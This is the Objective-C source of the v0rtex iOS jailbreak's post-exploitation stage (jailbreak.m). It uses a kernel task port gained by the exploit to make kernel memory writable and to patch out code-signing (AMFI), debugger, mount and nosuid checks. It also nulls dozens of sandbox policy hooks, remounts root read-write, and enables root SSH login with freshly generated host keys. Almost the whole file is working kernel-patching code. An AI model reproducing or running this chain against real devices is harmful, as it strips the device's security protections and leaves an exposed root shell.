//
//  jailbreak.m
//  v0rtex
//
//  Created by tihmstar on 14.12.17.
//  Copyright © 2017 tihmstar. All rights reserved.
//

#import <Foundation/Foundation.h>
#include <stdlib.h>
#include "exploit.h"
#include "patchfinder.h"
#include <mach-o/loader.h>
#include <sys/mount.h>
#include "sbops.h"
#include <spawn.h>
#include <copyfile.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <sys/mman.h>

task_t iPhoneHACKED = 0;
void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_address_t kdata, uint32_t ksize);
void runLaunchDaemons(void);
int easyPosixSpawn(NSURL *launchPath,NSArray *arguments);

//this one doesn't work for me
#define putTrampoline(at,jmpdst) (write_primitive((at), *(uint32_t*)"\xDF\xF8\x02\xF0"),write_primitive((at)+4, (jmpdst)))
//this one does
#define putTrampolineThumb(at,jmpdst) (write_primitive((at), *(uint32_t*)"\xDF\xF8\x00\xF0"),write_primitive((at)+4, (jmpdst)))

#define postProgress(prg) [[NSNotificationCenter defaultCenter] postNotificationName: @"JB" object:nil userInfo:@{@"JBProgress": prg}]

#if DEBUG
#define printf(a...) NSLog(@a)
#else
#define printf(a ...)
#endif

int (*dsystem)(const char *) = 0;


uint32_t kernelSize(void* kernel_base,uint32_t *lc_end){
    struct mach_header *mh=(struct mach_header *)kernel_base;
    struct load_command *lc=(struct load_command *)(mh+1);
    
    uint32_t firstSegment=UINT32_MAX;
    uint32_t endOfLastSegment=0;
    for (int i=0; i < mh->ncmds; i++){
        if (lc->cmd == LC_SEGMENT){
            struct segment_command *sc=(struct segment_command *)lc;
            if (sc->vmaddr<firstSegment) {
                firstSegment=sc->vmaddr;
            }
            if (sc->vmaddr+sc->vmsize>endOfLastSegment) {
                endOfLastSegment=sc->vmaddr+sc->vmsize;
            }
        }
        lc=(struct load_command*)(((char *)lc)+lc->cmdsize);
    }
    *lc_end=(uint32_t)lc;
    
    return endOfLastSegment-firstSegment;
}

#define assure(cond) do {if (!(cond)){ printf("Error: assure failed at line %d\n",__LINE__); return __LINE__; }} while(0)
#define doassure(cond,code) do {if (!(cond)){(code);assure(cond);}} while(0)

uint32_t read_primitive(uint32_t addr) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(iPhoneHACKED, addr, 4, (vm_address_t)&ret, &bytesRead);
    return ret;
}

void write_primitive(uint32_t addr, uint32_t value) {
    vm_write(iPhoneHACKED, addr, (vm_offset_t)&value, 4);
}

#define TTB_SIZE            4096
#define L1_SECT_S_BIT       (1 << 16)
#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
#define L1_SECT_APX         (1 << 15)
#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
uint32_t pmaps[TTB_SIZE];
int pmapscnt = 0;
void patch_kernel_pmap(uint32_t kernel_base, vm_address_t kdata, uint32_t ksize) {
    uint32_t kernel_pmap = find_kernel_pmap_nosym_11(kernel_base, (uint8_t*)kdata, ksize) + kernel_base;
    uint32_t kernel_pmap_store = read_primitive(kernel_pmap);
    uint32_t tte_virt = read_primitive(kernel_pmap_store);
    uint32_t tte_phys = read_primitive(kernel_pmap_store+4);
    
    printf("kernel pmap store @ 0x%08x\n", kernel_pmap_store);
    printf("kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);
    
    /* every page is writable */
    uint32_t i;
    for (i=0; i<TTB_SIZE; i++) {
        uint32_t addr = tte_virt+(i<<2);
        uint32_t entry = read_primitive(addr);
        if (entry==0) continue;
        if ((entry & 0x3)==1) {
            // If the 2 lsb are 1 that means there is a second level pagetable that we need to give readwrite access to
            uint32_t secondLevelPageAddr=(entry & (~0x3ff)) - tte_phys+tte_virt; // zero bytes 0-10 to get the pagetable address
            for (int i=0; i<256; i++) { // second level pagetable has 256 entries, we need to patch all of them
                uint32_t sladdr=secondLevelPageAddr+(i<<2);
                uint32_t slentry=read_primitive(sladdr);
                if (slentry==0)
                    continue;
                
                
                uint32_t newEntry=slentry & (~0x200); // set the 9th bit to zero
                if (slentry!=newEntry) {
                    write_primitive(sladdr, newEntry);
                    pmaps[pmapscnt++] = sladdr;
                }
            }
            continue;
        }
        
        if ((entry & L1_SECT_PROTO)==2) {
            uint32_t new_entry = L1_PROTO_TTE(entry);
            new_entry &= ~L1_SECT_APX;
            write_primitive(addr, new_entry);
        }
    }
    
    printf("Every page is actually writable\n");
    sleep(3);
}

void pmap_unpatch(){
    while (pmapscnt>0) {
        uint32_t sladdr = pmaps[--pmapscnt];
        uint32_t slentry=read_primitive(sladdr);
        
        uint32_t newEntry=slentry | (0x200); // set the 9th bit to one
        write_primitive(sladdr, newEntry);
    }
}

int jailbreak(){
    dsystem = dlsym(RTLD_DEFAULT,"system");
    printf("v0rtex\n");
    uint32_t kernel_base = 0;
    v0rtex(&iPhoneHACKED, &kernel_base);
    printf("done v0rtex!\n");
    
    vm_size_t bytesRead=0;
    char kdataPre[0x1000];
    kern_return_t kr=vm_read_overwrite(iPhoneHACKED, kernel_base, sizeof(kdataPre), (vm_address_t)kdataPre, &bytesRead);
    assure(!kr);
    
    uint32_t lc_len=0;
    uint32_t ksize=kernelSize(kdataPre,&lc_len);
    printf("Kernel size: 0x%08x\n",ksize);
    
    vm_address_t kdata=(vm_address_t)malloc(ksize);
    
    for (int i=0; (i<<12)<ksize; i++) {
        kern_return_t kr=vm_read_overwrite(iPhoneHACKED, kernel_base+(i<<12), 4096, kdata+(i<<12), &bytesRead);
        assure(!kr);
    }
    
    postProgress(@"patching pmap");
    patch_kernel_pmap(kernel_base,kdata,ksize);
    
    /* test kernel pmap patch */
    uint32_t write_test = 0x41424142;
    vm_write(iPhoneHACKED, kernel_base, (vm_offset_t)&write_test, sizeof(write_test));
    write_test = 0xfeedface;
    vm_write(iPhoneHACKED, kernel_base, (vm_offset_t)&write_test, sizeof(write_test));
    
    /* test kernel pmap patch */
    write_primitive(kernel_base, 0x41424142);
    assure(read_primitive(kernel_base) == 0x41424142);
    write_primitive(kernel_base, 0xfeedface);
    assure(read_primitive(kernel_base) == 0xfeedface);
    printf("pmap patch success!\n");
    
    betterWorkingAndShit(iPhoneHACKED,kernel_base,kdata,ksize);
    
    pmap_unpatch();
    
    
    runLaunchDaemons();
    
    printf("ok\n");
    return 0;
}

void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_address_t kdata, uint32_t ksize){
    printf("Hacking the kernel\n");
    
    uint32_t lc_len=0;
    kernelSize((void*)kdata,&lc_len);
    printf("Kernel size: 0x%08x\n",ksize);
    
    //patch i can has debugger: get first dword in i_can_has_debugger (should be 0 0 0 0) and set it to 1
    uint32_t i_can_has_debugger_dst;
    find_i_can_has_debugger_patch_off(kernel_base, kdata, ksize, &i_can_has_debugger_dst);
    printf("I can has debugger dst: 0x%08x\n",i_can_has_debugger_dst);
    write_primitive(i_can_has_debugger_dst, 0x1);
    
    
    postProgress(@"patching mount");
    uint32_t remount_patch_dst = find_remount_patch_offset(kernel_base, (uint8_t*)kdata, ksize) + kernel_base;
    printf("Found remount off: 0x%08x\n",remount_patch_dst);
    
    uint32_t toPatch=read_primitive(remount_patch_dst);
    printf("Original value 0x%08x\n",toPatch);
    toPatch &=0xFFFF00FF;
    toPatch |= 0xe000;
    write_primitive(remount_patch_dst, toPatch);
    
    
    //nosuid patch
    uint32_t nosuid1,nosuid2,rnosuid;
    nosuid1 = nosuid2 = rnosuid = 0;
    find_nosuid_off(kernel_base, (void*)kdata, ksize, &nosuid1, &nosuid2);
    if (nosuid1 && nosuid2) {
        postProgress(@"patching nosuid");
        read_primitive(nosuid1);
        rnosuid &=0xFF00FFFF;
        write_primitive(nosuid1, rnosuid);
        
        rnosuid = read_primitive(nosuid2);
        rnosuid &=0xFF00FFFF;
        write_primitive(nosuid2, rnosuid);
    }
    
    
    
    // Remount filesystem as readwrite
    postProgress(@"remounting filesystem");
    char* nm = strdup("/dev/disk0s1s1");
    int mntr = mount("apfs", "/", 0x10000, &nm);
    printf("Mount succeeded? %d\n",mntr);
    
    uint32_t proc_enforce = find_proc_enforce(kernel_base, kdata, ksize);
    printf("proc_enforce at=0x%08x\n",proc_enforce);
    if (proc_enforce){
        kern_return_t kr = vm_write(taskHacked, proc_enforce+kernel_base, (vm_offset_t)"\x00", 1);
        if (kr == KERN_SUCCESS){
            printf("patching proc_enforce ok!\n");
        }
    }
    
    // Patch amfi
    postProgress(@"patching amfi");
    uint32_t amfi_dst,amfi_tgt;
    find_amfi_patch_offsets(kernel_base, kdata, ksize, &amfi_dst, &amfi_tgt);
    printf("What we hacked: 0x%08x 0x%08x\n",amfi_dst,amfi_tgt);
    write_primitive(amfi_dst, amfi_tgt+1);
    
    // patch amfi.
    uint32_t cs_enforcement_disable_amfi = find_cs_enforcement_disable_amfi(kernel_base, kdata, ksize);
    printf("cs_enforcement_disable_amfi at=0x%08x\n",cs_enforcement_disable_amfi);
    if (cs_enforcement_disable_amfi){
        char patch[] ="\x00\xbf\x00\xbf\x00\xbf\x00\xbf\x00\xbf";
        kern_return_t kr = vm_write(taskHacked, cs_enforcement_disable_amfi+kernel_base, patch, sizeof(patch)-1);
        if (kr == KERN_SUCCESS){
            printf("patching cs_enforcement_disable_amfi ok!\n");
        }
    }
    
    //get-task-allow
    uint32_t amfi_task_allow = find_amfi_substrate_patch(kernel_base, (void*)kdata, ksize);
    printf("amfi_substrate_patch at=0x%08x\n",amfi_task_allow);
    if (amfi_task_allow){
        char patch[] ="\x20\xF4\x00\x70\x00\xBF\x40\xF0\x0F\x00";
        kern_return_t kr = vm_write(taskHacked, amfi_task_allow+kernel_base, (vm_offset_t)patch, sizeof(patch)-1);
        if (kr == KERN_SUCCESS){
            printf("patching amfi_substrate ok!\n");
        }
    }
    
    uint32_t label_update_execve = find_sandbox_label_update_execve(kernel_base, kdata, ksize);
    if (label_update_execve){
        char patch[] ="\x00\xBF\x00\xBF";
        kern_return_t kr = vm_write(taskHacked, label_update_execve+kernel_base, (vm_offset_t)patch, sizeof(patch)-1);
        if (kr == KERN_SUCCESS){
            printf("patching label_update_execve ok!\n");
        }
    }
    
    
    // marijuan
    uint32_t marijuanoff = (uint32_t)memmem(kdata+i_can_has_debugger_dst-kernel_base, ksize, "RELEASE_ARM",sizeof("RELEASE_ARM")-1)-kdata;
    kern_return_t kr=vm_write(taskHacked, marijuanoff+kernel_base, "Marijuan", 8);
    if (kr!=0) {
        printf("failed write kernel\n");
    }
    
    postProgress(@"patching sandbox");
    uint32_t sbops=0;
    find_sbops(kernel_base, (void*)kdata, ksize, &sbops);
    
    printf("Found sbops 0x%08x\n",sbops);
    
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
    
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
    
    
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_accept), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_accepted), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_bind), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_connect), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_create), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_label_update), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_listen), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_receive), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_received), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_select), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_send), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_stat), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_setsockopt), 0);
    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_getsockopt), 0);
    
    
    if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
        printf("write test success!\n");
        remove("/v0rtex");
    }else
        printf("[!] write test failed!\n");
    
    printf("ok\n");
}

extern int environ;
int easyPosixSpawn(NSURL *launchPath,NSArray *arguments){
    static int (*dposix_spawn_file_actions_init)(posix_spawn_file_actions_t *) = NULL;
    static int (*dposix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const __argv[], char *const __envp[]) = NULL;
    static int (*dposix_spawn_file_actions_destroy)(posix_spawn_file_actions_t *) = NULL;
    
    dposix_spawn_file_actions_init = dlsym(RTLD_DEFAULT, "posix_spawn_file_actions_init");
    dposix_spawn = dlsym(RTLD_DEFAULT, "posix_spawn");
    dposix_spawn_file_actions_destroy = dlsym(RTLD_DEFAULT, "posix_spawn_file_actions_destroy");
    
    
    
    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];
    
    int argc=posixSpawnArguments.count+1;
    printf("Number of posix_spawn arguments: %d\n",argc);
    char **args=calloc(argc,sizeof(char *));
    
    for (int i=0; i<posixSpawnArguments.count; i++)
        args[i]=(char *)[posixSpawnArguments[i]UTF8String];
    
    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);
    
    posix_spawn_file_actions_t action = NULL;
    dposix_spawn_file_actions_init(&action);
    
    pid_t pid;
    int status = 0;
    status = dposix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);
    
    if (status == 0) {
        if (waitpid(pid, &status, 0) != -1) {
            // wait
        }
    }
    
    dposix_spawn_file_actions_destroy(&action);
    
    return status;
}

int mysystem(char *cmd){
    return easyPosixSpawn([NSURL fileURLWithPath:@"/bin/bash"],@[@"-c",[NSString stringWithUTF8String:cmd]]);
}

void runLaunchDaemons(void){
    
    int r = 0;
    
    if (![[NSFileManager defaultManager]fileExistsAtPath:@"/bin/tar"]){
        postProgress(@"installing files");
        NSLog(@"We will try copying %s to %s\n", [[NSBundle mainBundle]URLForResource:@"tar" withExtension:@""].path.UTF8String, [NSURL fileURLWithPath:@"/bin/tar"].path.UTF8String);
        r = copyfile([[NSBundle mainBundle]URLForResource:@"tar" withExtension:@""].path.UTF8String, "/bin/tar", NULL, COPYFILE_ALL);
        if(r != 0){
            NSLog(@"copyfile returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            return;
        }
    }
    
    if(![[NSFileManager defaultManager] fileExistsAtPath:@"/Library/LaunchDaemons"]){
        postProgress(@"installing files");
        r = mkdir("/Library/LaunchDaemons", 0755);
        if(r != 0){
            NSLog(@"mkdir returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            return;
        }
    }
    
    NSLog(@"Changing permissions\n");
    r = chmod("/bin/tar", 0777);
    if(r != 0){
        NSLog(@"chmod returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
        return;
    }
    
    
    NSURL *bootstrapURL = [[NSBundle mainBundle]URLForResource:@"bootstrap" withExtension:@"tar"];
    r = [[NSFileManager defaultManager] fileExistsAtPath:@"/bin/bash"];
    if(!r){
        postProgress(@"installing bootstrap");
        NSLog(@"Extracting bootstrap...\n");
        r = easyPosixSpawn([NSURL fileURLWithPath:@"/bin/tar"], @[@"-xkvf", bootstrapURL.path, @"-C", @"/", @"--preserve-permissions"]);
        
        if(r != 0){
            NSLog(@"posix_spawn returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            //            return;
        }
        
        //ssh stuff
        FILE *sshd_config = fopen("/etc/sshd_config", "a");
        char appendbuf[] = "UsePrivilegeSeparation no\nPermitRootLogin yes\nPort 22\nPort 2222\n";
        fwrite(appendbuf, sizeof(appendbuf), 1, sshd_config);
        fclose(sshd_config);
    }
    
    
    postProgress(@"starting daemons");
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/etc/ssh_host_rsa_key"]){
        mysystem("/usr/bin/ssh-keygen -N '' -t rsa -f /etc/ssh_host_rsa_key");
    }
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/etc/ssh_host_ecdsa_key"]){
        mysystem("/usr/bin/ssh-keygen -N '' -t ecdsa -f /etc/ssh_host_ecdsa_key");
    }
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/etc/ssh_host_ed25519_key"]){
        mysystem("/usr/bin/ssh-keygen -N '' -t ed25519 -f /etc/ssh_host_ed25519_key");
    }
    
    mysystem("/usr/sbin/sshd");
    
    mysystem("echo 'really jailbroken'");
    
    NSLog(@"done\n");
    postProgress(@"done");
    exit(0);
}

